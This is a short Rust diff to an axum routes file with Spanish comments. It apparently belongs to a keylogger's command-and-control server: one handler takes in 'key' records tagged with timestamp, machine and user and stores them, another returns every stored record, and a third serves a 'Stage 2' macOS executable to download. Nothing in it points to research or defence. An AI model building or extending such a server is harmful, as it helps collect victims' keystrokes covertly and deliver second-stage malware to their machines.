@@ -1,3 +1,4 @@
+// routes.rs (sin cambios, solo asegurar que recibe el JSON completo)
 use axum::{
     extract::State,
     http::StatusCode,
@@ -19,6 +20,7 @@ pub async fn receive_key(
     State(storage): State<Arc<Storage>>,
     Json(payload): Json<serde_json::Value>,
 ) -> StatusCode {
+    // El payload debe tener: key, timestamp, machine, user
     storage.add(payload);
     StatusCode::CREATED
 }
@@ -29,8 +31,7 @@ pub async fn get_keys(
     Json(storage.get_all())
 }
 
-// SERVIR EL PAYLOAD (Stage 2) - CORREGIDO
+// SERVIR EL PAYLOAD (Stage 2)
 pub async fn serve_payload() -> Vec<u8> {
-    // Leer el ejecutable compilado de stage2_macos
     std::fs::read("./payloads/stage2_macos").unwrap_or_default()
 }
